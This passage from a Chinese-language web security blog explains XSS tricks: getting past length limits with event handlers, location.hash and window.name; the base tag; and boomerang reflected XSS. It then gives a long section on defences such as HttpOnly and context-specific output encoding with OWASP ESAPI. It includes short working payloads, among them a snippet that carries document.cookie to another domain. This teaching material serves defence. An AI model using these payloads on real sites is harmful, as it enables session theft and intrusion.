</span></span></span></code></pre></td></tr></table></div></div><p>其中 <code>"</code> 会被逃逸（即在符号前面插入 <code>\</code> 这个字符），但是因为前面的介绍，在宽字符集中，这个反斜杠会被我们的 <code>%c1</code> 吃掉形成一个 Unicode 字符，从而使 <code>;</code> 逃逸出来。</p><h3 id=绕过长度限制>绕过长度限制</h3><p>比如 url 为 <code>http://www.a.com/index.html</code> 中的 <code>html</code> 存在通过下面的方式渲染：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>text</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;$var&#34;</span> <span class=p>/&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>如果服务端对字符串的长度做了限制，那么攻击者直接构造 <code>&lt;script></code> 标签则可能会导致过长：</p><ol><li><p>第一种办法是将 <code>JavaScript</code> 代码绑定到一个事件中去，比如：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$var 赋值为 &#34;onclick=alert(1)//
</span></span></code></pre></td></tr></table></div></div></li><li><p>但是利用 <code>事件</code> 能够缩短的字节数是有限的。最好的办法是将 XSS Payload 写到别处。</p><p>最常用的一个“隐藏代码”的地方就是 <code>location.hash</code>。而且根据 HTTP 协议，这个内容不会再网络请求中发送，所以 WEB 服务器也不会记录我们隐藏的内容。</p><p>因为 <code>location.hash</code> 的第一个字符是 <code>#</code>，所以必须去除第一个字符才行，所以可以构造：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$var 赋值为 &#34;onclick=&#34;eval(location.hash.substr(1))
</span></span></code></pre></td></tr></table></div></div><p>同时构造一个 HTML <code>url</code> 为：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http://www.a.com/index.html#alert(1)
</span></span></code></pre></td></tr></table></div></div></li><li><p>再某些环境下，可以利用注释符绕过长度限制。</p><p>比如我们能控制两个文本框，第二个文本框允许写入更多的字节。此时可以利用 HTML 的注释符号，把两个文本框之间的代码全部注释掉，从而 “打通” 两个 <code>&lt;input></code> 标签。</p></li></ol><h3 id=base-标签><code>&lt;base></code> 标签</h3><p>这个标签的作用是定义页面上使用 “相对路径” 标签的 <code>hosting</code> 地址。比如：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>base</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;http://www.google.com/&#34;</span> <span class=p>/&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>img</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;/int1/en_ALL/images/srpr/logolw.png&#34;</span> <span class=p>/&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>上面这段代码将会使得 <code>&lt;img></code> 标签中的图片从 <code>http://www.google.com/int1/en_ALL/images/srpr/logolw.png</code> 取得。</p><p>可见 <code>&lt;base></code> 标签是个极其危险的标签。所以在设计 XSS 安全方案时，一定要过滤掉这个非常危险的标签。</p><h3 id=windowname-的使用><code>window.name</code> 的使用</h3><p><code>window.name</code> 对象是一个神奇的东西。如果对当前窗口的 <code>window.name</code> 对象赋值，没有特殊字符的限制。因为 window 对象是浏览器的窗体，而非 document 对象，很多时候不受同源策略的限制。攻击者利用这个对象，可以实现跨页面传递数据。</p><p>比如 <code>www.a.com/index.html</code> 的代码如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nb>window</span><span class=p>.</span><span class=nx>name</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>cookie</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nb>window</span><span class=p>.</span><span class=nx>location</span> <span class=o>=</span> <span class=s2>&#34;http://www.b.com/index.html&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>这段代码将把在域 <code>www.a.com</code> 中的 <code>cookie</code> 携带到 <code>www.b.com</code> 这个域中。在后者中可以访问这个内容：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nb>window</span><span class=p>.</span><span class=nx>name</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>使用 <code>window.name</code> 可以缩短 XSS Payload 的长度，在目标站点只需要执行以下代码即可：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nb>eval</span><span class=p>(</span><span class=nx>name</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>这个只有 11 个字符。</p><p>这个技巧为安全研究者 luoluo 发现，另外它还整理了许多 XSS 长度绕过技巧（见 《突破 XSS 字符数量限制执行任意 JS 代码》）。</p><h2 id=利用反射型-xss>利用反射型 XSS</h2><h3 id=apache-expect-header-xss>Apache Expect Header XSS</h3><p>这个漏洞最早公布于 2006 年。</p><p>这是 Apache 的漏洞，影响范围相当广。但是这个利用这个漏洞，需要提交请求时向 HTTP 头中注入恶意数据，才能触发这个漏洞。但对于 XSS 攻击来说，JavaScript 时无法控制 HTTP 请求头的。所以这个漏洞曾经一度被认为是 “鸡肋” 漏洞。</p><p>后来安全研究者 &ldquo;Amit Klein&rdquo; 提出了 “使用 Flash 构造请求” 的方法，成功利用了这个漏洞。</p><h3 id=anehta-的回旋镖>Anehta 的回旋镖</h3><p>反射型 XSS 也有可能像存储型 XSS 一样利用，将要利用的反射型 XSS 嵌入一个存储型 XSS 中。这个攻击技巧，曾经在 Anehta（道哥写过的一个攻击平台）中使用过。</p><p>回旋镖的思路是：</p><ul><li>如果在 B 域上存在一个反射型的 &ldquo;XSS_B&rdquo;，在 A 域上存在一个存储型 ”XSS_A“；</li><li>当用户访问 A 域上的 ”XSS_A“ 时，同时嵌入 B 域上的 ”XSS_B“，则可以达到在 A 域上的 XSS 攻击 B 域用户的目的。</li></ul><h2 id=xss-的防御>XSS 的防御</h2><p>流行的浏览器都内置了一些对抗 XSS 的措施，比如 <code>FireFox</code> 的 <code>CSP</code>、<code>Noscript</code> 扩展、<code>IE 8</code> 内置的 XSS Filter 等。</p><p>在本章中，主要把精力放在如何为网站设计安全的 XSS 解决方案上。</p><h3 id=httponly><code>HttpOnly</code></h3><p>最早由微软提出，并且在 IE 6 中实现，至今已经逐渐成为一个标准。浏览器将禁止页面的 <code>JavaScript</code> 访问带有 <code>HttpOnly</code> 属性的 <code>Cookie</code>。</p><p><code>HttpOnly</code> 的出现并非为了对抗 XSS，它解决的是 XSS 后的 Cookie 劫持攻击。</p><p>一个 Cookie 的使用流程如下：</p><ol><li><p>浏览器向服务器发起请求，这时没有 Cookie；</p></li><li><p>服务器返回时发送 <code>Set-Cookie</code> 头，向客户端浏览器写入 Cookie；</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Set-Cookie: &lt;name&gt;=&lt;value&gt;[; &lt;Max-Age&gt;=&lt;age&gt;][; expire=&lt;date&gt;][; domain=&lt;domain_name&gt;][; path=&lt;some_path&gt;][; secure][; HttpOnly]
</span></span></code></pre></td></tr></table></div></div></li><li><p>在该 Cookie 到期前，浏览器访问域下的所有页面，都将发送该 Cookie；</p></li></ol><p>需要注意的是，服务器可能会设置多个 Cookie，而 <code>HttpOnly</code> 可以有选择性地加在任何一个 Cookie 上。</p><h3 id=输入检查>输入检查</h3><p>在 XSS 防御上，输入检查一般是检查用户输入的数据是否包含一些特殊字符，比如 <code>&lt;</code>、<code>></code>、<code>'</code>、<code>"</code> 等。如果发现存在特殊字符，则将这些字符过滤或者编码。</p><p>这种输入检查方式被称为 ”<strong>XSS Filter</strong>“。互联网上有很多开源的 ”XSS Filter“ 的实现。</p><p>XSS Filter 在用户提交数据时获取变量，并进行 XSS 检查，但此时数据并没有结合渲染页面的 HTML 代码，因此 XSS Filter 对语境的<strong>理解并不完整</strong>。可能会改变用户的数据的语义。</p><h3 id=输出检查>输出检查</h3><p>一般来说，富文本（Rich Text Format, <code>RTF</code>）的输出外，在变量输出到 HTML 页面时，可以使用编码或转义的方式来防御 XSS 攻击。</p><p>编码分为很多种，针对 HTML 代码的编码方式时 <code>HtmlEncode</code>：这并非一个专用名词，它只是一种函数实现，它对应的标准时 <code>ISO-8859-1</code>。</p><p>为了对抗 XSS，在编码中至少要求以下的字符被转换：</p><table><thead><tr><th><code>&</code></th><th><code>&lt;</code></th><th><code>></code></th><th><code>"</code></th><th><code>'</code></th><th><code>/</code></th></tr></thead><tbody><tr><td><code>&amp;amp;</code></td><td><code>&amp;lt;</code></td><td><code>&amp;gt;</code></td><td><code>&amp;quot;</code></td><td><code>&amp;#x27;</code></td><td><code>&amp;#x2F;</code></td></tr></tbody></table><p>在 OWASP ESAPI 中有一个安全的 <code>JavaScriptEncode</code> 的实现，非常严格。使用举例：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nb>String</span> <span class=nx>safe</span> <span class=o>=</span> <span class=nx>ESAPI</span><span class=p>.</span><span class=nx>encoder</span><span class=p>().</span><span class=nx>encodeForHTMLAttribute</span><span class=p>(</span> <span class=nx>request</span><span class=p>.</span><span class=nx>getParameter</span><span class=p>(</span><span class=s2>&#34;input&#34;</span><span class=p>)</span> <span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>// 除了字母，数字外的所有特殊字符都被编码成 HTMLEntities.
</span></span></span></code></pre></td></tr></table></div></div><p>对于不同的输出类型，下面列举了多个防御 XSS 的总结。下面用 <code>$var</code> 表示用户数据，它将被填入 HTML 代码中。可能存在以下的场景：</p><ol><li><p>在 HTML 标签中输出：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>a</span> <span class=na>href</span><span class=o>=</span><span class=s>#</span><span class=p>&gt;</span>$var<span class=p>&lt;/</span><span class=nt>a</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>在这种场景下，XSS 的利用方式一般是构造一个 <code>&lt;script></code> 标签。防御方法是是对变量使用 <code>HtmlEncode</code>。</p></li><li><p>在 HTML 属性中输出：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>div</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;abc&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;$var&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>防御方式也是 HtmlEncode。因为这种方式变量是用户不可见的，因此可以采用 OWASP ESAPI 中的严格编码方式，将所有特殊字符都进行编码。</p></li><li><p>在 <code>&lt;script></code> 标签中输出，应当首先保证输出的变量在引号中：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;script&gt;
</span></span><span class=line><span class=cl>	var x = &#34;$var&#34;;
</span></span><span class=line><span class=cl>&lt;/script&gt;
</span></span></code></pre></td></tr></table></div></div><p>因此攻击者需要闭合引号才能实施攻击，防御时使用 <code>JavascriptEncode</code>。</p></li><li><p>在事件中输出：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;a href=# onclick=&#34;funcA(&#39;$var&#39;)&#34;&gt;test&lt;/a&gt;
</span></span></code></pre></td></tr></table></div></div><p>这个输出域在 <code>&lt;script></code> 标签中的输出类似。在防御时使用 <code>JavascriptEncode</code>。</p></li><li><p>在 <code>css</code> 中输出，攻击方式见 <a href=#csspayload rel>利用 <code>CSS</code> 构造</a>。</p><p>可见利用 <code>css</code> 的攻击可谓是相当丰富。因此我们应当尽可能禁止用户可控制的变量在 <code>&lt;style></code> 标签、<code>html</code> 标签的 <code>style</code> 属性、以及 <code>css</code> 文件中输出。如果一定有这样的需求，建议使用 OWASP ESAPI 中的函数 <code>encodeForCSS()</code>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nb>String</span> <span class=nx>safe</span> <span class=o>=</span> <span class=nx>ESAPI</span><span class=p>.</span><span class=nx>encoder</span><span class=p>().</span><span class=nx>encodeForCSS</span><span class=p>(</span> <span class=nx>request</span><span class=p>.</span><span class=nx>getParameter</span><span class=p>(</span><span class=s2>&#34;input&#34;</span><span class=p>)</span> <span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>它会把除了字母、数字外的所有字符都编码成十六进制的形式 <code>\uHH</code>。</p></li><li><p>在地址中输出：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>a</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;http://hacker.org/?test=$var&#34;</span><span class=p>&gt;</span>test<span class=p>&lt;/</span><span class=nt>a</span><span class=p>&gt;</span>s
</span></span></code></pre></td></tr></table></div></div><p>一般来说使用函数 <code>URLEncode</code> 即可，它会将字符转化为 <code>%HH</code> 的形式。</p><p>但是还有一种情况，就是整个 URL 都能够被用户控制，这时 URL 的 <code>Protocal</code> 部门与 <code>Host</code> 部分是不能够使用 <code>URLEncode</code> 的，否则会改变 URL 的含义。</p><p>攻击者可能会通过构造 <code>javascript</code>、<code>vbscript</code>、<code>dataURI</code> 等伪协议导致脚本攻击：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>a</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;javascript:alert(1)&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>a</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p><code>dataURI</code> 伪协议是 <code>Mozilla</code> 浏览器支持的，能够写一段代码在 URL 中：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>a</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&#34;</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div></li></ol></div><div id=comments><div id=valine class=comment></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://valine.js.org/>Valine</a>.</noscript></div></div></div></main><footer class=footer><div class=footer-container><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2022 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=https://shesl-meow.github.io target=_blank>佘崧林</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title=回到顶部><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
</a><a href=# id=view-comments class=fixed-button title=查看评论><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=/lib/valine/valine.min.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/contrib/copy-tex.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/valine@1.4.18/dist/Valine.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js></script><script type=text/javascript src=/lib/lunr/lunr.stemmer.support.min.8127f0ca4cabc7246f3620f3ef3bf9b1db02805dfe03d6d4c57bc74bc0bf6eea.js integrity="sha256-gSfwykyrxyRvNiDz7zv5sdsCgF3+A9bUxXvHS8C/buo="></script><script type=text/javascript src=/lib/lunr/lunr.zh.min.825fab54c26891370cbd3df4cdff5c9de31af8bb84474e6774573463d8708ae7.js integrity="sha256-gl+rVMJokTcMvT30zf9cneMa+LuER05ndFc0Y9hwiuc="></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/contrib/auto-render.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/contrib/copy-tex.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/contrib/mhchem.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"复制到剪贴板",maxShownLines:50},comment:{valine:{appId:"zDVJohJIQbD6f3W267xtaYRC-gzGzoHsz",appKey:"ewsfU9ocNOeuvt0MzONe6yKx",avatar:"mp",el:"#valine",emojiCDN:"https://cdn.jsdelivr.net/npm/emoji-datasource-google@14.0.0/img/google/64/",emojiMaps:{100:"1f4af.png",alien:"1f47d.png",anger:"1f4a2.png",angry:"1f620.png",anguished:"1f627.png",astonished:"1f632.png",black_heart:"1f5a4.png",blue_heart:"1f499.png",blush:"1f60a.png",bomb:"1f4a3.png",boom:"1f4a5.png",broken_heart:"1f494.png",brown_heart:"1f90e.png",clown_face:"1f921.png",cold_face:"1f976.png",cold_sweat:"1f630.png",confounded:"1f616.png",confused:"1f615.png",cry:"1f622.png",crying_cat_face:"1f63f.png",cupid:"1f498.png",dash:"1f4a8.png",disappointed:"1f61e.png",disappointed_relieved:"1f625.png",dizzy:"1f4ab.png",dizzy_face:"1f635.png",drooling_face:"1f924.png",exploding_head:"1f92f.png",expressionless:"1f611.png",face_vomiting:"1f92e.png",face_with_cowboy_hat:"1f920.png",face_with_hand_over_mouth:"1f92d.png",face_with_head_bandage:"1f915.png",face_with_monocle:"1f9d0.png",face_with_raised_eyebrow:"1f928.png",face_with_rolling_eyes:"1f644.png",face_with_symbols_on_mouth:"1f92c.png",face_with_thermometer:"1f912.png",fearful:"1f628.png",flushed:"1f633.png",frowning:"1f626.png",ghost:"1f47b.png",gift_heart:"1f49d.png",green_heart:"1f49a.png",grimacing:"1f62c.png",grin:"1f601.png",grinning:"1f600.png",hankey:"1f4a9.png",hear_no_evil:"1f649.png",heart:"2764-fe0f.png",heart_decoration:"1f49f.png",heart_eyes:"1f60d.png",heart_eyes_cat:"1f63b.png",heartbeat:"1f493.png",heartpulse:"1f497.png",heavy_heart_exclamation_mark_ornament:"2763-fe0f.png",hole:"1f573-fe0f.png",hot_face:"1f975.png",hugging_face:"1f917.png",hushed:"1f62f.png",imp:"1f47f.png",innocent:"1f607.png",japanese_goblin:"1f47a.png",japanese_ogre:"1f479.png",joy:"1f602.png",joy_cat:"1f639.png",kiss:"1f48b.png",kissing:"1f617.png",kissing_cat:"1f63d.png",kissing_closed_eyes:"1f61a.png",kissing_heart:"1f618.png",kissing_smiling_eyes:"1f619.png",laughing:"1f606.png",left_speech_bubble:"1f5e8-fe0f.png",love_letter:"1f48c.png",lying_face:"1f925.png",mask:"1f637.png",money_mouth_face:"1f911.png",nauseated_face:"1f922.png",nerd_face:"1f913.png",neutral_face:"1f610.png",no_mouth:"1f636.png",open_mouth:"1f62e.png",orange_heart:"1f9e1.png",partying_face:"1f973.png",pensive:"1f614.png",persevere:"1f623.png",pleading_face:"1f97a.png",pouting_cat:"1f63e.png",purple_heart:"1f49c.png",rage:"1f621.png",relaxed:"263a-fe0f.png",relieved:"1f60c.png",revolving_hearts:"1f49e.png",right_anger_bubble:"1f5ef-fe0f.png",robot_face:"1f916.png",rolling_on_the_floor_laughing:"1f923.png",scream:"1f631.png",scream_cat:"1f640.png",see_no_evil:"1f648.png",shushing_face:"1f92b.png",skull:"1f480.png",skull_and_crossbones:"2620-fe0f.png",sleeping:"1f634.png",sleepy:"1f62a.png",slightly_frowning_face:"1f641.png",slightly_smiling_face:"1f642.png",smile:"1f604.png",smile_cat:"1f638.png",smiley:"1f603.png",smiley_cat:"1f63a.png",smiling_face_with_3_hearts:"1f970.png",smiling_imp:"1f608.png",smirk:"1f60f.png",smirk_cat:"1f63c.png",sneezing_face:"1f927.png",sob:"1f62d.png",space_invader:"1f47e.png",sparkling_heart:"1f496.png",speak_no_evil:"1f64a.png",speech_balloon:"1f4ac.png","star-struck":"1f929.png",stuck_out_tongue:"1f61b.png",stuck_out_tongue_closed_eyes:"1f61d.png",stuck_out_tongue_winking_eye:"1f61c.png",sunglasses:"1f60e.png",sweat:"1f613.png",sweat_drops:"1f4a6.png",sweat_smile:"1f605.png",thinking_face:"1f914.png",thought_balloon:"1f4ad.png",tired_face:"1f62b.png",triumph:"1f624.png",two_hearts:"1f495.png",unamused:"1f612.png",upside_down_face:"1f643.png",weary:"1f629.png",white_frowning_face:"2639-fe0f.png",white_heart:"1f90d.png",wink:"1f609.png",woozy_face:"1f974.png",worried:"1f61f.png",yawning_face:"1f971.png",yellow_heart:"1f49b.png",yum:"1f60b.png",zany_face:"1f92a.png",zipper_mouth_face:"1f910.png",zzz:"1f4a4.png"},enableQQ:!1,highlight:!0,lang:"zh-CN",pageSize:10,placeholder:"你的评论 ...",recordIP:!0,serverURLs:"https://zdvjohji.lc-cn-n1-shared.com",visitor:!0}},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!0,left:"\\begin{equation}",right:"\\end{equation}"},{display:!0,left:"\\begin{equation*}",right:"\\end{equation*}"},{display:!0,left:"\\begin{align}",right:"\\end{align}"},{display:!0,left:"\\begin{align*}",right:"\\end{align*}"},{display:!0,left:"\\begin{alignat}",right:"\\end{alignat}"},{display:!0,left:"\\begin{alignat*}",right:"\\end{alignat*}"},{display:!0,left:"\\begin{gather}",right:"\\end{gather}"},{display:!0,left:"\\begin{CD}",right:"\\end{CD}"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1},search:{highlightTag:"em",lunrLanguageCode:"zh",lunrSegmentitURL:"/lib/lunr/lunr.segmentit.js",maxResultLength:10,noResultsFound:"没有找到结果",snippetLength:30}}</script><script type=text/javascript src=/js/theme.min.b0df51c2c57145081cc73960e9aa780e6f5f56d06cf4ef0f96da8ce1619d1e12.js integrity="sha256-sN9RwsVxRQgcxzlg6ap4Dm9fVtBs9O8PltqM4WGdHhI="></script></body></html>